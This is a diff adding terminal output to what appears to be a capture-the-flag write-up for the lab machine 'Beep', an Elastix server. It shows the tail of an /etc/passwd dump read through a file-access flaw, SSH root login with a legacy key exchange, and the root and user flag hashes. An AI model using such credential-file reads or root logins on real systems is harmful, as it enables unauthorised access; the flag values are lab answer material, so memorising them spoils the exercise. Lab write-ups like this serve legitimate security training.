@@ -38,3 +38,60 @@ xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
 fanis:x:501:501::/home/fanis:/bin/bash
 Sorry! Attempt to access restricted file.
 ```
+
+
+hippoeug@kali:~$ ssh root@10.10.10.7
+Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+hippoeug@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 10.10.10.7
+The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? 
+Host key verification failed.
+hippoeug@kali:~$ ping 10.10.10.7
+PING 10.10.10.7 (10.10.10.7) 56(84) bytes of data.
+64 bytes from 10.10.10.7: icmp_seq=1 ttl=63 time=4.88 ms
+64 bytes from 10.10.10.7: icmp_seq=2 ttl=63 time=5.07 ms
+^C
+--- 10.10.10.7 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1003ms
+rtt min/avg/max/mdev = 4.880/4.974/5.068/0.094 ms
+hippoeug@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 10.10.10.7
+The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
+RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
+hippoeug@10.10.10.7's password: 
+
+hippoeug@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
+root@10.10.10.7's password: 
+Permission denied, please try again.
+root@10.10.10.7's password: 
+Permission denied, please try again.
+root@10.10.10.7's password: 
+Last login: Tue Jul 16 11:45:47 2019
+
+Welcome to Elastix 
+----------------------------------------------------
+
+To access your Elastix System, using a separate workstation (PC/MAC/Linux)
+Open the Internet Browser using the following URL:
+http://10.10.10.7
+
+[root@beep ~]# ls
+anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
+[root@beep ~]# cat root.txt
+89dfb87953f6ecfb95897002221d0311
+[root@beep ~]# cd ..
+[root@beep /]# ls
+bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  selinux  srv  sys  tftpboot  tmp  usr  var
+[root@beep /]# cd ..
+[root@beep /]# ls
+bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  selinux  srv  sys  tftpboot  tmp  usr  var
+[root@beep /]# cd home
+[root@beep home]# ls
+fanis  spamfilter
+[root@beep home]# cd fanis
+[root@beep fanis]# ls
+user.txt
+[root@beep fanis]# cat user.txt
+798c7c7c1711198d3120ec639be0a321
